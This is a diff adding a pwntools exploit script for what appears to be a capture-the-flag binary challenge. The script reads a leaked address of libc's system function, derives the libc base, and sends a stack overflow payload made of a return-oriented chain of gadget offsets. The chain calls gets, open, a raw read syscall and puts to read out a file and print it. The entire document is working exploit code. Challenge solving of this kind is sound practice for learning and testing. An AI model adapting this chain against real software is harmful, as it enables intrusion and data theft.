@@ -1,0 +1,69 @@
+#!/usr/bin/env python3
+from pwn import *
+import warnings
+warnings.filterwarnings("ignore")
+exe = ELF("./challe")
+libc = ELF("./libc.so.6")
+ld = ELF("./ld-linux-x86-64.so.2")
+# context.log_level='debug'
+# p = remote("challs.pwnoh.io", 13371)
+p = process([exe.path])
+def gdbs():
+    context.terminal = ["foot"]
+    gdb.attach(p, gdbscript="""
+
+               """)
+    # p = gdb.debug([exe.path],"""
+    #
+    #                 """)
+
+sla = lambda msg, data: p.sendlineafter(msg, data)
+sa = lambda msg, data: p.sendafter(msg, data)
+sl = lambda data: p.sendline(data)
+s = lambda data: p.send(data)
+gdbs()
+p.recvuntil("Try it yourself: it's at ")
+addr = int(p.recvuntil("Surely that's",drop=True),16)
+libc.address = addr - libc.sym.system
+log.info(f"system: {hex(addr)}")
+log.info(f"libc: {hex(libc.address)}")
+pop_rdi = libc.address + 0x000000000002a3e5
+pop_rsi = libc.address+0x000000000002be51
+pop_rax = libc.address + 0x0000000000045eb0
+pop_rdx = libc.address + 0x000000000011f2e7
+pop_rbp = libc.address + 0x000000000002a2e0
+ret = libc.address + 0x0000000000029139
+sysc = libc.address + 0x114885
+push_rax = libc.address+0x0000000000041563
+section = libc.address + 0x21a000
+leave_ret = libc.address + 0x000000000004da83
+log.info(f"section rw: {hex(section+0x1500)}")
+payload = b"a"*40
+def syscall(rax,rdi=0,rsi=0,rdx=0):
+    payload=p64(pop_rdi)+p64(rdi)
+    payload+=p64(pop_rsi)+p64(rsi)
+    payload+=p64(pop_rdx)+p64(rdx)+p64(0)
+    payload+=p64(pop_rax)+p64(rax)
+    payload+=p64(sysc)
+    return payload
+payload+=p64(pop_rdi)+p64(section+0x1000)
+payload+=p64(libc.sym.gets)
+payload+=p64(pop_rdi)+p64(section+0x1000)
+payload+=p64(libc.sym.open)
+payload+=p64(pop_rdi)+p64(3)
+payload+=p64(pop_rsi)+p64(section+0x1500)
+payload+=p64(pop_rdx)+p64(0x80)+p64(0)
+payload+=p64(pop_rax)+p64(0)
+payload+=p64(sysc)
+payload+=p64(pop_rdi)
+payload+=p64(section+0x1500)
+payload+=p64(libc.sym.puts)
+sla("else.",payload)
+
+
+
+
+
+p.interactive()
+# good luck pwning :)
+
